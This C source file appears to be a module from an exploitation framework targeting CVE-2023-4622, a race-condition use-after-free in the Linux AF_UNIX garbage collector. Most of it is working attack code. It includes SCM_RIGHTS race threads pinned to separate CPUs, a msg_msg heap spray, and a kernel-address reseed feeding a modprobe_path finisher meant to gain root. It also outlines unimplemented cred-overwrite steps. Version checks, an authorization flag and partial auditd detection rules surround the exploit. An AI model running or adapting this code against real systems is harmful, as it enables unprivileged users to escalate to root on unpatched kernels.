/*
 * af_unix_gc_cve_2023_4622 — SKELETONKEY module
 *
 * AF_UNIX garbage collector race UAF. The unix_gc() collector walks
 * the list of GC-candidate sockets while SCM_RIGHTS sendmsg/close can
 * concurrently mutate the inflight refcount on the same sockets. The
 * narrow window between a socket being marked GC-eligible and the
 * collector actually freeing it can be widened by tightly cycling
 * SCM_RIGHTS messages — when the race wins, a `struct unix_sock` is
 * freed while still reachable from another thread's skb queue, giving
 * slab UAF in the SLAB_TYPESAFE_BY_RCU kmalloc-512 bucket.
 *
 * Discovered by Lin Ma (ZJU) in Aug 2023. Public exploit chain uses
 * the UAF + msg_msg cross-cache spray to refill the freed slot, then
 * pivots through the now-controlled `unix_sock->peer` field.
 *
 * STATUS: 🟡 PRIMITIVE — race-driver + msg_msg groom + empirical
 *   witness. We carry the trigger (SCM_RIGHTS cycle + GC), the
 *   kmalloc-512 spray, CPU pinning for race-win improvement, and the
 *   slab-delta + signal-disposition witness. We do NOT carry the
 *   leak (no read primitive in-module) nor a kernel-build-specific
 *   fake unix_sock layout. Per verified-vs-claimed: a SIGSEGV/SIGKILL
 *   in the race child IS recorded but does NOT upgrade to EXPLOIT_OK
 *   — only an actual cred swap (euid==0) does, and we do not
 *   demonstrate that without --full-chain.
 *
 *   --full-chain (HONEST RELIABILITY): extends the race budget from
 *   5 s to 30 s and re-sprays kmalloc-512 with payloads carrying the
 *   target kaddr at strided offsets. Race-win rate on a real
 *   vulnerable kernel is iteration-dependent — Lin Ma's PoC reports
 *   thousands of iterations to first reclaim. The shared
 *   modprobe_path finisher's 3 s sentinel timeout catches the
 *   overwhelmingly common no-land outcome gracefully.
 *
 * Affected: ALL Linux kernels with AF_UNIX below the fix. The bug
 * has been in the GC path since the 2.x era. Stable backports:
 *   4.14.x : K >= 4.14.326
 *   4.19.x : K >= 4.19.295
 *   5.4.x  : K >= 5.4.257
 *   5.10.x : K >= 5.10.197
 *   5.15.x : K >= 5.15.130
 *   6.1.x  : K >= 6.1.51   (LTS)
 *   6.5.x  : K >= 6.5.0    (mainline fix)
 *   6.6+   : patched
 *
 * Preconditions:
 *   - AF_UNIX socket creation works (always — no module gate)
 *   - msgsnd / sysv IPC available for spray
 *   - SCM_RIGHTS via sendmsg available (universal)
 *   - userns NOT required — works as a plain unprivileged user
 *
 * Coverage rationale: the AF_UNIX GC has been touched extensively
 * for the 2023-2024 series of races (Lin Ma + Pwn2Own follow-ups);
 * this CVE is the first publicly-disclosed entry in that series and
 * carries the widest version range of any module we ship.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <stdatomic.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>

#ifdef __linux__
#  include <sched.h>
#  include <sys/ipc.h>
#  include <sys/msg.h>
#  include <sys/un.h>
#endif

/* macOS clangd lacks Linux SCM_* / CMSG_* fully — guard fallbacks. */
#ifndef SCM_RIGHTS
#  define SCM_RIGHTS 0x01
#endif
#ifndef SOL_SOCKET
#  define SOL_SOCKET 1
#endif
#ifndef MSG_DONTWAIT
#  define MSG_DONTWAIT 0x40
#endif

/* ---- Kernel-range table ------------------------------------------ */

static const struct kernel_patched_from af_unix_gc_patched_branches[] = {
    {4, 14, 326},
    {4, 19, 295},
    {5,  4, 257},
    {5, 10, 197},
    {5, 15, 130},
    {6,  1,  51},   /* 6.1 LTS */
    {6,  4,  13},   /* 6.4.x stable (per Debian tracker — forky/sid/trixie) */
    {6,  5,   0},   /* mainline fix landed in 6.5 (technically 6.6-rc1
                       but stable 6.5.x carries the patch) */
};

static const struct kernel_range af_unix_gc_range = {
    .patched_from = af_unix_gc_patched_branches,
    .n_patched_from = sizeof(af_unix_gc_patched_branches) /
                      sizeof(af_unix_gc_patched_branches[0]),
};

/* ---- Detect ------------------------------------------------------- */

/* Sanity: can we actually create an AF_UNIX socket on this host?
 * In some seccomp/ns-restricted sandboxes socket(AF_UNIX, ...) fails;
 * in that case the exploit cannot even reach the GC path. */
static bool can_create_af_unix(void)
{
    int s = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (s < 0) return false;
    close(s);
    return true;
}

static skeletonkey_result_t af_unix_gc_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] af_unix_gc: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* No lower bound: this bug has been in the AF_UNIX GC path since
     * the dawn of time. ANY kernel below the fix is vulnerable. The
     * kernel_range walker handles "older than every entry" correctly
     * (returns false → not patched → vulnerable). */
    bool patched = kernel_range_is_patched(&af_unix_gc_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_unix_gc: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    /* Reachability probe — socket(AF_UNIX, ...) must succeed. */
    if (!can_create_af_unix()) {
        if (!ctx->json) {
            fprintf(stderr, "[-] af_unix_gc: AF_UNIX socket() failed — "
                            "exotic seccomp/sandbox, bug unreachable here\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] af_unix_gc: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] af_unix_gc: bug is reachable as PLAIN UNPRIVILEGED USER\n"
                        "    (no userns / no CAP_* required — AF_UNIX is universally\n"
                        "    creatable). The race window is microseconds wide and\n"
                        "    needs thousands of iterations to win on average.\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Race-driver state ------------------------------------------- */

#ifdef __linux__

#define AFUG_RACE_TIME_BUDGET       5     /* seconds — primitive-only mode */
#define AFUG_RACE_FULLCHAIN_BUDGET  30    /* seconds — --full-chain */

/* kmalloc-512 spray width — `struct unix_sock` is in the kmalloc-512
 * bucket on 64-bit x86 with SLAB_TYPESAFE_BY_RCU. We need enough
 * msg_msg slots to make refill probable within the RCU grace period. */
#define AFUG_SPRAY_QUEUES      24
#define AFUG_SPRAY_PER_QUEUE   48
#define AFUG_SPRAY_PAYLOAD     496   /* 512 - 16 (msg_msg hdr) */

/* SCM_RIGHTS race width: how many inflight fds per cycle. The bug
 * is driven by inflight count crossing the GC threshold; a handful
 * per cycle keeps the GC heuristic primed without OOM. */
#define AFUG_SCM_FDS_PER_MSG   3

struct ipc_payload {
    long mtype;
    unsigned char buf[AFUG_SPRAY_PAYLOAD];
};

static _Atomic int g_race_running;
static _Atomic uint64_t g_thread_a_iters;
static _Atomic uint64_t g_thread_b_iters;
static _Atomic uint64_t g_thread_a_errs;

/* Pin to a CPU to make Thread A and Thread B land on different cores.
 * Best-effort: failure is non-fatal (e.g., affinity disallowed under
 * some seccomp configs). */
static void pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}

/* The race victim region: a pair of socketpair(AF_UNIX) endpoints
 * forming a reference cycle. Closing one end while the other has
 * inflight fds queued is what naturally triggers unix_gc().
 *
 * Layout we drive (Lin Ma style):
 *
 *   pair_a = socketpair(); pair_b = socketpair();
 *   send pair_b[0] via SCM_RIGHTS over pair_a[0] → pair_a[1]
 *   send pair_a[0] via SCM_RIGHTS over pair_b[0] → pair_b[1]
 *   close all 4 endpoints — now we have a cycle the GC will collect
 *
 * Thread A loops the build-cycle-and-close.
 * Thread B loops sending its own SCM_RIGHTS messages on independent
 * pairs to perturb the inflight count + race the collector. */

/* Send an SCM_RIGHTS message with `nfds` fds over `sock`. Returns 0
 * on success, -1 on error. */
static int send_scm_rights(int sock, const int *fds, int nfds)
{
    char ctrl[CMSG_SPACE(sizeof(int) * AFUG_SCM_FDS_PER_MSG)];
    memset(ctrl, 0, sizeof ctrl);

    char payload = 0;
    struct iovec iov = { .iov_base = &payload, .iov_len = 1 };

    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl;
    msg.msg_controllen = CMSG_SPACE(sizeof(int) * nfds);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (!cmsg) return -1;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type  = SCM_RIGHTS;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(int) * nfds);
    memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * nfds);

    if (sendmsg(sock, &msg, MSG_DONTWAIT) < 0) return -1;
    return 0;
}

/* Thread A: tight-loop SCM_RIGHTS-cycle + close to drive GC.
 *
 * Each iteration:
 *   1. Build two socketpairs (A=[a0,a1], B=[b0,b1]).
 *   2. Send b0 via SCM_RIGHTS over a0 → a1 receives nothing yet (we
 *      don't recvmsg — that's the point: the fd stays inflight).
 *   3. Send a0 via SCM_RIGHTS over b0 → b1 receives nothing yet.
 *   4. close() all 4 user-side fds.  Now both endpoints are unreachable
 *      from userspace BUT each is referenced from the other's skb
 *      queue → reference cycle → next unix_gc() pass collects them.
 *
 * The kernel's GC heuristic kicks when the inflight count exceeds
 * the count of file refs in the system; closing the user-side fds in
 * a tight loop reliably triggers it. */
static void *race_thread_a(void *arg)
{
    (void)arg;
    pin_to_cpu(0);
    while (atomic_load_explicit(&g_race_running, memory_order_acquire)) {
        int pa[2], pb[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pa) < 0) {
            atomic_fetch_add_explicit(&g_thread_a_errs, 1, memory_order_relaxed);
            sched_yield();
            continue;
        }
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pb) < 0) {
            close(pa[0]); close(pa[1]);
            atomic_fetch_add_explicit(&g_thread_a_errs, 1, memory_order_relaxed);
            sched_yield();
            continue;
        }

        /* Cycle: send pb[0] over pa, send pa[0] over pb. We also send
         * pb[1]/pa[1] alongside to widen the inflight count per cycle
         * (the GC trigger heuristic compares inflight vs total file
         * refs — more inflight per cycle == earlier GC). */
        int fds_a[AFUG_SCM_FDS_PER_MSG] = { pb[0], pb[1], pb[0] };
        int fds_b[AFUG_SCM_FDS_PER_MSG] = { pa[0], pa[1], pa[0] };
        (void)send_scm_rights(pa[0], fds_a, AFUG_SCM_FDS_PER_MSG);
        (void)send_scm_rights(pb[0], fds_b, AFUG_SCM_FDS_PER_MSG);

        /* Close the user-side fds. The kernel-side refs are now only
         * held via the inflight skbs — perfect reference cycle for
         * the GC to find. */
        close(pa[0]); close(pa[1]);
        close(pb[0]); close(pb[1]);

        atomic_fetch_add_explicit(&g_thread_a_iters, 1, memory_order_relaxed);
    }
    return NULL;
}

/* Thread B: independent SCM_RIGHTS traffic on a held pair to keep
 * the GC scan list churning while Thread A creates new candidates.
 *
 * Holds a long-lived socketpair and repeatedly sends + recvs SCM_RIGHTS
 * with random fds (dup'd from /dev/null). This drives the GC's "scan
 * list" rebuild path concurrently with Thread A's frees — the race
 * window that fires the UAF is exactly here.
 *
 * We don't directly call unix_gc() — there's no userspace knob — but
 * the GC heuristic is inflight-count driven, and Thread A's cycle
 * loop pushes that count past the threshold within a few thousand
 * iterations. */
static void *race_thread_b(void *arg)
{
    (void)arg;
    pin_to_cpu(1);

    /* Long-lived pair for the perturbation loop. */
    int held[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, held) < 0) {
        return NULL;
    }

    /* Spare fd source — /dev/null dups are harmless to pass. */
    int devnull = open("/dev/null", O_RDWR);
    if (devnull < 0) {
        close(held[0]); close(held[1]);
        return NULL;
    }

    while (atomic_load_explicit(&g_race_running, memory_order_acquire)) {
        int fds[AFUG_SCM_FDS_PER_MSG];
        for (int i = 0; i < AFUG_SCM_FDS_PER_MSG; i++) {
            fds[i] = dup(devnull);
        }
        (void)send_scm_rights(held[0], fds, AFUG_SCM_FDS_PER_MSG);
        for (int i = 0; i < AFUG_SCM_FDS_PER_MSG; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }

        /* Drain the recv side so the held pair doesn't backpressure. */
        char drain[16];
        char ctrl[CMSG_SPACE(sizeof(int) * AFUG_SCM_FDS_PER_MSG)];
        struct iovec iov = { .iov_base = drain, .iov_len = sizeof drain };
        struct msghdr msg = {0};
        msg.msg_iov = &iov; msg.msg_iovlen = 1;
        msg.msg_control = ctrl; msg.msg_controllen = sizeof ctrl;
        if (recvmsg(held[1], &msg, MSG_DONTWAIT) > 0) {
            /* Close any fds we received so we don't leak. */
            for (struct cmsghdr *c = CMSG_FIRSTHDR(&msg); c;
                 c = CMSG_NXTHDR(&msg, c)) {
                if (c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
                    int nfd = (c->cmsg_len - CMSG_LEN(0)) / sizeof(int);
                    int *rfds = (int *)CMSG_DATA(c);
                    for (int j = 0; j < nfd; j++)
                        if (rfds[j] >= 0) close(rfds[j]);
                }
            }
        }

        atomic_fetch_add_explicit(&g_thread_b_iters, 1, memory_order_relaxed);
    }

    close(devnull);
    close(held[0]); close(held[1]);
    return NULL;
}

/* ---- msg_msg cross-cache spray for kmalloc-512 ------------------- */

static int spray_kmalloc_512(int queues[AFUG_SPRAY_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x55;   /* 'U' — unix */
    memset(p.buf, 0x55, sizeof p.buf);
    memcpy(p.buf, "SKELETONKEYU", 8);

    int created = 0;
    for (int i = 0; i < AFUG_SPRAY_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < AFUG_SPRAY_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_kmalloc_512(int queues[AFUG_SPRAY_QUEUES])
{
    for (int i = 0; i < AFUG_SPRAY_QUEUES; i++) {
        if (queues[i] >= 0) msgctl(queues[i], IPC_RMID, NULL);
    }
}

/* Read /proc/slabinfo for kmalloc-512 active count. Used as the
 * primary empirical witness: a successful UAF + refill perturbs
 * this counter in a way that's distinguishable from idle drift. */
static long slab_active_kmalloc_512(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-512 ", 12) == 0) {
            char name[64];
            long act = 0, num = 0;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ---- Arb-write primitive (FALLBACK depth) ------------------------
 *
 * The shared modprobe_path finisher calls back here once per kernel
 * write. For AF_UNIX GC race we cannot deliver a deterministic
 * arb-write — the underlying race wins on a small fraction of runs
 * even with a 30 s budget, and even when the race wins our spray-only
 * groom has nowhere near the precision of Lin Ma's multi-stage public
 * PoC (which crafts a fake unix_sock whose `peer` pointer steers a
 * subsequent SCM_RIGHTS dispatch into the kaddr we want written).
 *
 * Honest depth: FALLBACK. Each invocation:
 *   1. Re-seeds the kmalloc-512 spray with payloads tagged with
 *      `kaddr` packed at strided offsets (so wherever the UAF reclaim
 *      lands attacker-controlled bytes inside the freed unix_sock,
 *      our kaddr appears at the field offset).
 *   2. Re-runs the race threads for the extended full-chain budget.
 *   3. Returns 0 — we cannot in-process verify the write landed. The
 *      shared finisher's 3 s sentinel file check is the empirical
 *      arbiter: on the overwhelmingly common no-land outcome it
 *      returns EXPLOIT_FAIL gracefully. */
struct af_unix_gc_arb_ctx {
    int    *queues;
    int     n_queues;
    int     arb_calls;
};

static int af_unix_gc_reseed_kaddr_spray(int queues[AFUG_SPRAY_QUEUES],
                                         uintptr_t kaddr,
                                         const void *buf, size_t len)
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x52;   /* 'R' — arb-write reseed (distinct from groom 0x55) */
    memset(p.buf, 0x52, sizeof p.buf);
    memcpy(p.buf, "IAMU4ARB", 8);

    /* Plant kaddr at strided slots so wherever the kernel's UAF
     * follows a ptr in the refilled chunk, one of these is read.
     * unix_sock has multiple pointer fields (peer, link, scm_stat,
     * etc.) — strided coverage hits whichever one the UAF dispatch
     * dereferences. */
    for (size_t off = 0x10; off + sizeof(uintptr_t) <= sizeof p.buf;
         off += 0x18) {
        memcpy(p.buf + off, &kaddr, sizeof(uintptr_t));
    }

    /* Caller's bytes immediately after the cookie so any path that
     * reads payload data (rather than a chased pointer) finds the
     * requested write contents inline. */
    size_t copy = len;
    if (copy > sizeof p.buf - 16) copy = sizeof p.buf - 16;
    if (buf && copy) memcpy(p.buf + 8 + sizeof(uintptr_t), buf, copy);

    int touched = 0;
    for (int i = 0; i < AFUG_SPRAY_QUEUES && touched < 6; i++) {
        if (queues[i] < 0) continue;
        if (msgsnd(queues[i], &p, sizeof p.buf, IPC_NOWAIT) == 0) touched++;
    }
    return touched;
}

static int af_unix_gc_arb_write(uintptr_t kaddr,
                                const void *buf, size_t len,
                                void *ctx_v)
{
    struct af_unix_gc_arb_ctx *c = (struct af_unix_gc_arb_ctx *)ctx_v;
    if (!c || !c->queues || c->n_queues == 0) return -1;
    c->arb_calls++;

    fprintf(stderr, "[*] af_unix_gc: arb_write attempt #%d kaddr=0x%lx len=%zu "
                    "(FALLBACK — race-dependent)\n",
            c->arb_calls, (unsigned long)kaddr, len);

    int seeded = af_unix_gc_reseed_kaddr_spray(c->queues, kaddr, buf, len);
    if (seeded == 0) {
        fprintf(stderr, "[-] af_unix_gc: arb_write: kaddr-tagged reseed produced 0 msgs\n");
    } else {
        fprintf(stderr, "[*] af_unix_gc: arb_write: reseeded %d msg_msg slots\n",
                seeded);
    }

    /* Re-run the race with the extended budget. */
    atomic_store(&g_race_running, 1);
    atomic_store(&g_thread_a_iters, 0);
    atomic_store(&g_thread_b_iters, 0);
    atomic_store(&g_thread_a_errs, 0);

    pthread_t ta, tb;
    bool a_ok = pthread_create(&ta, NULL, race_thread_a, NULL) == 0;
    bool b_ok = a_ok &&
                pthread_create(&tb, NULL, race_thread_b, NULL) == 0;
    if (!a_ok || !b_ok) {
        atomic_store(&g_race_running, 0);
        if (a_ok) pthread_join(ta, NULL);
        fprintf(stderr, "[-] af_unix_gc: arb_write: pthread_create failed\n");
        return -1;
    }

    sleep(AFUG_RACE_FULLCHAIN_BUDGET);
    atomic_store(&g_race_running, 0);
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    uint64_t a_iters = atomic_load(&g_thread_a_iters);
    uint64_t b_iters = atomic_load(&g_thread_b_iters);
    fprintf(stderr, "[*] af_unix_gc: arb_write: extended race A=%llu B=%llu\n",
            (unsigned long long)a_iters,
            (unsigned long long)b_iters);

    /* Cannot in-process verify the write — let the finisher's sentinel
     * arbitrate. */
    return 0;
}

/* ---- Exploit driver ---------------------------------------------- */

static skeletonkey_result_t af_unix_gc_exploit_linux(const struct skeletonkey_ctx *ctx)
{
    /* 1. Refuse-gate: re-call detect() and short-circuit. */
    skeletonkey_result_t pre = af_unix_gc_detect(ctx);
    if (pre == SKELETONKEY_OK) {
        fprintf(stderr, "[+] af_unix_gc: kernel not vulnerable; refusing exploit\n");
        return SKELETONKEY_OK;
    }
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] af_unix_gc: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] af_unix_gc: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Full-chain pre-check: resolve offsets BEFORE the race fork. If
     * modprobe_path is unresolvable we refuse here rather than running
     * a 30 s race that has no finisher to call. */
    struct skeletonkey_kernel_offsets off;
    bool full_chain_ready = false;
    if (ctx->full_chain) {
        memset(&off, 0, sizeof off);
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("af_unix_gc");
            fprintf(stderr, "[-] af_unix_gc: --full-chain requested but "
                            "modprobe_path offset unresolved; refusing\n");
            fprintf(stderr, "[i] af_unix_gc: even with offsets, race-win rate is\n"
                            "    a small fraction per run — see module header.\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);
        full_chain_ready = true;
        fprintf(stderr, "[i] af_unix_gc: --full-chain ready — race budget extends\n"
                        "    to %d s. RELIABILITY remains race-dependent on a real\n"
                        "    vulnerable kernel. The finisher's 3 s sentinel timeout\n"
                        "    catches no-land outcomes gracefully.\n",
                AFUG_RACE_FULLCHAIN_BUDGET);
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] af_unix_gc: forking exploit child (SCM_RIGHTS cycle "
                        "race harness%s)\n",
                ctx->full_chain ? " + full-chain finisher" : "");
    }

    signal(SIGPIPE, SIG_IGN);

    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* 2. Groom: pre-populate kmalloc-512 with msg_msg payloads
         *    BEFORE the race so the freed unix_sock slot gets recycled
         *    with attacker-controlled bytes when the bug fires. */
        int queues[AFUG_SPRAY_QUEUES] = {0};
        for (int i = 0; i < AFUG_SPRAY_QUEUES; i++) queues[i] = -1;
        int n_queues = spray_kmalloc_512(queues);
        if (n_queues == 0) {
            fprintf(stderr, "[-] af_unix_gc: msg_msg spray produced 0 queues "
                            "(sysv IPC restricted?)\n");
            _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] af_unix_gc: kmalloc-512 spray seeded %d queues x %d msgs\n",
                    n_queues, AFUG_SPRAY_PER_QUEUE);
        }

        long slab_pre = slab_active_kmalloc_512();

        /* 3. Run the race for a bounded time budget. */
        atomic_store(&g_race_running, 1);
        atomic_store(&g_thread_a_iters, 0);
        atomic_store(&g_thread_b_iters, 0);
        atomic_store(&g_thread_a_errs, 0);

        pthread_t ta, tb;
        if (pthread_create(&ta, NULL, race_thread_a, NULL) != 0 ||
            pthread_create(&tb, NULL, race_thread_b, NULL) != 0) {
            fprintf(stderr, "[-] af_unix_gc: pthread_create failed\n");
            atomic_store(&g_race_running, 0);
            drain_kmalloc_512(queues);
            _exit(24);
        }

        sleep(AFUG_RACE_TIME_BUDGET);
        atomic_store(&g_race_running, 0);
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);

        long slab_post = slab_active_kmalloc_512();
        uint64_t a_iters = atomic_load(&g_thread_a_iters);
        uint64_t b_iters = atomic_load(&g_thread_b_iters);
        uint64_t a_errs  = atomic_load(&g_thread_a_errs);

        /* 4. Empirical witness breadcrumb. */
        FILE *log = fopen("/tmp/skeletonkey-af_unix_gc.log", "w");
        if (log) {
            fprintf(log,
                "af_unix_gc race harness (CVE-2023-4622):\n"
                "  thread_a_iters     = %llu (SCM_RIGHTS cycle + close)\n"
                "  thread_b_iters     = %llu (SCM_RIGHTS perturb)\n"
                "  thread_a_errors    = %llu (socketpair / send failures)\n"
                "  slab_kmalloc512_pre  = %ld\n"
                "  slab_kmalloc512_post = %ld\n"
                "  slab_delta           = %ld\n"
                "  spray_queues       = %d\n"
                "  spray_per_queue    = %d\n"
                "  race_budget_secs   = %d\n"
                "Note: this run did NOT attempt cred overwrite. The bug is a\n"
                "slab UAF with no in-process leak primitive; per-kernel offsets\n"
                "for unix_sock layout aren't baked. See module .c for the\n"
                "continuation roadmap (Lin Ma fake-peer plant).\n",
                (unsigned long long)a_iters,
                (unsigned long long)b_iters,
                (unsigned long long)a_errs,
                slab_pre, slab_post,
                (slab_post >= 0 && slab_pre >= 0) ? (slab_post - slab_pre) : 0,
                n_queues, AFUG_SPRAY_PER_QUEUE,
                AFUG_RACE_TIME_BUDGET);
            fclose(log);
        }

        if (!ctx->json) {
            fprintf(stderr, "[*] af_unix_gc: race ran for %ds — A=%llu B=%llu A_errs=%llu\n",
                    AFUG_RACE_TIME_BUDGET,
                    (unsigned long long)a_iters,
                    (unsigned long long)b_iters,
                    (unsigned long long)a_errs);
            fprintf(stderr, "[*] af_unix_gc: kmalloc-512 active: pre=%ld post=%ld\n",
                    slab_pre, slab_post);
        }

        /* Hold the spray briefly so the kernel observes refilled slots
         * during any in-flight RCU grace periods that started during
         * the race. */
        usleep(200 * 1000);

        /* 5. --full-chain finisher (FALLBACK depth). */
        if (full_chain_ready) {
            struct af_unix_gc_arb_ctx arb_ctx = {
                .queues    = queues,
                .n_queues  = AFUG_SPRAY_QUEUES,
                .arb_calls = 0,
            };
            int fr = skeletonkey_finisher_modprobe_path(&off,
                                                    af_unix_gc_arb_write,
                                                    &arb_ctx,
                                                    !ctx->no_shell);
            FILE *fl = fopen("/tmp/skeletonkey-af_unix_gc.log", "a");
            if (fl) {
                fprintf(fl, "full_chain finisher rc=%d arb_calls=%d\n",
                        fr, arb_ctx.arb_calls);
                fclose(fl);
            }
            drain_kmalloc_512(queues);
            if (fr == SKELETONKEY_EXPLOIT_OK) _exit(34);   /* root popped */
            _exit(35);                                  /* finisher ran, no land */
        }

        drain_kmalloc_512(queues);

        /* 6. Continuation roadmap — what would land EXPLOIT_OK.
         *
         *    TODO(leak): replace a spray queue with msgrcv(..., MSG_COPY|
         *    IPC_NOWAIT) probes and scan the returned buffer for non-
         *    cookie bytes. A freed unix_sock that's refilled by msg_msg
         *    after a partial overwrite would leak kernel pointers
         *    (peer, scm_stat, list_node prev/next) into the readback.
         *    Recover {kbase, init_task} via that leak.
         *
         *    TODO(write): with kbase known, plant a fake unix_sock
         *    whose `peer` pointer references &current->cred — the
         *    next SCM_RIGHTS dispatch through the freed slot writes
         *    a controlled value into that location. Crafting the
         *    fake unix_sock requires offset of unix_sock fields per
         *    kernel build (different across LTS branches).
         *
         *    TODO(overwrite): land &init_cred over current->cred so
         *    the next permission check sees uid==0.
         *
         *    None of these are implemented today. Exit 30 = "trigger
         *    ran cleanly, no escalation".
         */
        _exit(30);
    }

    /* PARENT */
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    if (w < 0) { perror("waitpid"); return SKELETONKEY_TEST_ERROR; }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr, "[!] af_unix_gc: race child killed by signal %d "
                            "(consistent with UAF firing under KASAN)\n", sig);
            fprintf(stderr, "[~] af_unix_gc: empirical signal recorded; no cred\n"
                            "    overwrite primitive — NOT claiming EXPLOIT_OK.\n"
                            "    See /tmp/skeletonkey-af_unix_gc.log + dmesg for witnesses.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] af_unix_gc: child terminated abnormally (status=0x%x)\n",
                status);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 23 || rc == 24) return SKELETONKEY_PRECOND_FAIL;

    if (rc == 34) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_unix_gc: --full-chain finisher reported "
                            "EXPLOIT_OK (race won + write landed)\n");
        }
        return SKELETONKEY_EXPLOIT_OK;
    }
    if (rc == 35) {
        if (!ctx->json) {
            fprintf(stderr, "[~] af_unix_gc: --full-chain finisher ran; race did not\n"
                            "    win + land within budget (expected outcome on most\n"
                            "    runs — race wins are a fraction of a percent).\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (rc != 30) {
        fprintf(stderr, "[-] af_unix_gc: child failed at stage rc=%d\n", rc);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] af_unix_gc: race harness ran to completion.\n");
        fprintf(stderr, "[~] af_unix_gc: read/write/cred-overwrite primitives NOT\n"
                        "    implemented (per-kernel offsets; see module .c TODO\n"
                        "    blocks). Returning EXPLOIT_FAIL per verified-vs-claimed.\n");
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}

#endif /* __linux__ */

static skeletonkey_result_t af_unix_gc_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] af_unix_gc: --exploit requires --i-know; refusing\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
#ifdef __linux__
    return af_unix_gc_exploit_linux(ctx);
#else
    (void)ctx;
    fprintf(stderr, "[-] af_unix_gc: Linux-only module; cannot run on this host\n");
    return SKELETONKEY_PRECOND_FAIL;
#endif
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t af_unix_gc_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] af_unix_gc: cleaning up race-harness breadcrumb\n");
    }
    if (unlink("/tmp/skeletonkey-af_unix_gc.log") < 0 && errno != ENOENT) {
        /* harmless */
    }
    /* Race threads + msg queues live inside the now-exited child;
     * nothing else to drain. */
    return SKELETONKEY_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char af_unix_gc_auditd[] =
    "# AF_UNIX GC race UAF (CVE-2023-4622) — auditd detection rules\n"
    "# The trigger is a tight loop of socketpair(AF_UNIX) + sendmsg with\n"
    "# SCM_RIGHTS passing inflight fds, followed by close. Each call is\n"
    "# benign — flag the *frequency* by correlating these keys with a\n"
    "# subsequent KASAN message in dmesg.\n"
